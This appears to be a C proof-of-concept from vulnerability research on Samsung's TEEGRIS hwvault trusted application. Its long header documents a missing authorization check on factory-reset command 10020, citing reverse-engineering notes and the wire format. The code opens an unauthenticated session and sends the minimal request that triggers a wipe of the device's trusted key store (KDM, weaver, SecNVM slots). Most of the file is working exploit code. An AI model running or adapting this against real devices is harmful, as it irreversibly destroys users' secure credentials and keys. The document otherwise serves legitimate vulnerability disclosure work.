/*
 * ============================================================================
 * HvAUtW (hwvault) cmd 10020 = HV_TZ_CMD_FACTORY_RESET — UNAUTHENTICATED
 * trusted-store wipe / factory reset.
 * ============================================================================
 *
 * FINDING (headline):  factory-reset / bulk-wipe with NO caller authorization.
 * SEVERITY:            HIGH.
 * TA / UUID:           HvAUtW "hwvault" driver,
 *                      00000000-0000-0000-0000-487641557457.
 *
 * CITATION (RE/samsung_teegris/hvautw.md):
 *   - Finding #2, lines 313-330:
 *       "The dispatcher tz_process_command @0xFD7C applies no per-command
 *        login/identity gate; every HV_TZ_CMD_* arm is reachable from the REE
 *        invoke path once a session is open. ... hv_factory_reset @0x130B4
 *        (cmd 10020) — wipes KDM, weaver, all SecNVM slots. ... Neither
 *        requires an authsecret or a production/bootloader-attested signature.
 *        A normal-world process that can open a session to the TA can
 *        annihilate the trusted store. Status: CONFIRMED-IN-BINARY for the
 *        absence of an in-TA gate."
 *   - Attack-surface table, line 250 (cmd 10020 row):
 *       "HV_TZ_CMD_FACTORY_RESET — Wipes everything (KDM, weaver, SecNVM
 *        slots). Should be gated to the bootloader factory-reset path; if a
 *        normal-world process can hit it, this is total trust-store
 *        annihilation."
 *   - Open follow-up #4, lines 940-942 (RESOLVED):
 *       "hv_factory_reset @0x130B4 has no authsecret check, no bootloader
 *        signature, and no caller-identity verification inside the TA. The
 *        dispatcher tz_process_command @0xFD7C applies no per-command auth."
 *   - cmd id + handler, line 208 / re_teegris_hvautw.py:166:
 *       "(10020, 0x130B4, hv_factory_reset, 'Wipe ALL hwvault state -- KDM,
 *        weaver, secnvm slots.')"
 *   - Cleared-in-pass-3, lines 918-920 (the ONLY in-TA gate, and it is just a
 *     shape check, not an auth check):
 *       "TA_InvokeCommandEntryPoint @0xA628 rejects param_types != 0x65 and
 *        runs TEES_IsREESharedMemory on both memrefs before deref; input is
 *        copied to the heap before parse (no double-fetch)."
 *   So the *only* precondition to reach hv_factory_reset is: open a session
 *   (PUBLIC login is accepted, see finding #2 + the teessu/gatekeeper analogue
 *   — TEEGRIS TA OpenSession returns 0 with no caller check) and send a
 *   well-formed param_types==0x65 invoke whose TLV cmd_id word == 10020.
 *   No credential, no authsecret, no signature is consulted.
 *
 * WIRE FORMAT of params[0] (the MEMREF_INPUT request).  Shared TLV envelope
 * with FbCkmR — both route through the same deserialiser sub_F0F4
 * (hvautw.md line 217 "Same TLV shape as FbCkmR"; fbckmr.md lines 45-48,
 * 105-110; FbCkmR poc.c lines 5-8). Layout:
 *
 *     [u32 cmd_id][u32 payload_len L][TLV items...]      total = L + 8
 *       TLV bytes item  : [u32 tag (hi byte 0x02)][u32 len][len bytes]
 *       TLV integer item: [u32 tag (hi byte 0x01)][u32 value]
 *
 *   The deserialiser enforces a strict total-length invariant
 *   (hvautw.md lines 904-905: sub_F0F4 "enforces a strict total length
 *   (a2[1]+8 == a3)") — a2[1] is the payload_len at offset 4, the +8 is the
 *   [cmd_id][payload_len] header. cmd_id is the first 4-byte word
 *   (hvautw.md lines 79-83, 112: "the input MEMREF carries a TLV item-list
 *   whose first 4 bytes are the HV_TZ_CMD_* id ... cmd_id is the first
 *   4-byte item in the request").
 *
 * TRIGGER:  hv_factory_reset (cmd 10020) is a "wipe ALL state" command. It
 *   takes NO slot_id / credential / blob argument (contrast the cred/persistent
 *   handlers cmd 10014-10019 which read a slot_id; contrast SET_KDM/weaver which
 *   read blobs). It wipes KDM + weaver + every SecNVM slot wholesale. Hence the
 *   minimal valid request is just the 8-byte envelope header with ZERO trailing
 *   TLV items:  [u32 10020][u32 0].  We send exactly that.
 *
 * GP INVOKE param_types == 0x65.  hvautw.md lines 78-79 / 916-920:
 *   "TA_InvokeCommandEntryPoint requires param_types == 0x65 =
 *    TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_INOUT, NONE, NONE)".
 *   NIBBLE NOTE (grounded): the TEE-side GP enum is
 *   {MEMREF_INPUT=4, MEMREF_OUTPUT=5, MEMREF_INOUT=6}
 *   (emulator/emulate/gp/utils/param.py:5-7), while the client TEEC enum is
 *   {TEMP_INPUT=5, TEMP_OUTPUT=6, TEMP_INOUT=7} (tee_client_api.h:113-115).
 *   The on-wire byte that satisfies the TA's "== 0x65" gate is produced by
 *   TEEC_PARAM_TYPES(TEMP_INPUT, TEMP_OUTPUT) = 5 | (6<<4) = 0x65 — this is the
 *   exact, proven convention used by every other working 0x65 PoC in this
 *   corpus (keymst_hmacfinish/poc.c:174, semese_dercert, fbckmr_import/poc.c:103).
 *   (TEMP_INOUT=7 would yield 0x75 and the gate would reject it.) So we encode
 *   the "MEMREF_INPUT, MEMREF_INOUT" intent with the client constants that wire
 *   up to 0x65.
 *
 * ---------------------------------------------------------------------------
 * REPRO-STATUS (be precise — see RE/emulation/hvautw.md, Finding #2, lines
 * 84-119, and the build-delta note lines 9-31):
 *
 *   missing-auth-gate ............ CONFIRMED-IN-BINARY (static, finding #2).
 *                                  The control-flow fact "no per-command auth
 *                                  before hv_factory_reset" is established from
 *                                  the dispatcher disassembly.
 *
 *   in-emulator reachability ..... PARTIAL. cmd 10020 (HV_TZ_CMD_FACTORY_RESET)
 *                                  IS present in the bundled S9BYH2 emulator
 *                                  build (emulation/hvautw.md line 90:
 *                                  "grep -aoc HV_TZ_CMD_FACTORY_RESET -> 1"),
 *                                  unlike the cmd-10036 RCE chain which is
 *                                  CODE-ABSENT in S9BYH2 (the SECNVM-manifest
 *                                  feature post-dates this build —
 *                                  emulation/hvautw.md lines 9-31, 40-63). So
 *                                  this PoC can drive the OpenSession + invoke
 *                                  dispatch path that the missing gate lives on.
 *                                  HOWEVER: HvAUtW is a *driver* TA and its
 *                                  .json has an empty TA_DestroyEntryPoint_end,
 *                                  which ta_mgr.py hard-rejects on load
 *                                  (emulation/hvautw.md lines 93-101) — so as
 *                                  shipped the driver TA may not load without a
 *                                  hand-patched .json.
 *
 *   wipe EFFECT .................. DEVICE-ONLY. hv_factory_reset immediately
 *                                  calls SecNVM/SPU wipe routines (cm_ssp_snvm)
 *                                  that the emulator does not model
 *                                  (emulation/hvautw.md lines 112-114), so even
 *                                  once the session opens and the dispatcher
 *                                  routes to the handler, the persistent
 *                                  KDM/weaver/SecNVM destruction can only be
 *                                  observed on real Exynos S24/A55 hardware.
 *
 * In short: this PoC demonstrates the *reachability* of the wipe command with
 * no credential (the finding), not the destructive side effect (device-only).
 * ---------------------------------------------------------------------------
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

/* HV_TZ_CMD_FACTORY_RESET — hvautw.md line 208, re_teegris_hvautw.py:101,166. */
#define HV_TZ_CMD_FACTORY_RESET  10020u

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }

int main(void)
{
    char* ta = "00000000-0000-0000-0000-487641557457";   /* HvAUtW (hwvault) */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. Per finding #2 the TA's OpenSession has no
     * caller check; reaching hv_factory_reset needs only an open session. */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to HvAUtW (hwvault) with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* ---- build the TLV envelope for cmd 10020 in params[0] -----------------
     * Minimal valid request: [u32 cmd_id=10020][u32 payload_len=0], no items.
     * factory-reset wipes ALL state, so it has no slot/credential body. */
    uint8_t *in  = (uint8_t*)allocate_param_mem(&context, 0x1000);  /* MEMREF_INPUT  */
    uint8_t *out = (uint8_t*)allocate_param_mem(&context, 0x1000);  /* MEMREF_INOUT  */
    if (!in || !out) { printf("[!] allocate_param_mem failed\n"); exit(-1); }

    put_u32(in + 0, HV_TZ_CMD_FACTORY_RESET);  /* cmd_id word (first 4 bytes) */
    put_u32(in + 4, 0u);                        /* payload_len L = 0 (no TLV items) */
    uint32_t req_len = 8;                       /* total = L + 8 = 8 */

    printf("[*] TLV envelope (req %u bytes): cmd_id=%u (HV_TZ_CMD_FACTORY_RESET), payload_len=0\n",
           req_len, HV_TZ_CMD_FACTORY_RESET);
    DumpHex(in, 16, in);

    memset(&op, 0, sizeof(op));
    /* param_types == 0x65: nibble0 = TEMP_INPUT(5), nibble1 = TEMP_OUTPUT(6).
     * Wire byte 0x65 is what the TA's "== 0x65" gate (MEMREF_INPUT, MEMREF_INOUT)
     * requires — see the NIBBLE NOTE in the block comment above. */
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = 0x1000;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = 0x1000;

    printf("[*] invoking GP cmd 10020 (HV_TZ_CMD_FACTORY_RESET) with ptypes=0x%x ...\n",
           op.paramTypes);
    res = TEEC_InvokeCommand_impl(&session, HV_TZ_CMD_FACTORY_RESET, &op, &err_origin);
    printf("[*] FACTORY_RESET returned 0x%x (origin 0x%x)\n", res, err_origin);
    printf("[*] reachability demonstrated: no credential/authsecret/signature was\n"
           "    required to reach the wipe handler (finding #2). The destructive\n"
           "    KDM/weaver/SecNVM wipe itself is DEVICE-ONLY (cm_ssp_snvm not modelled).\n");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
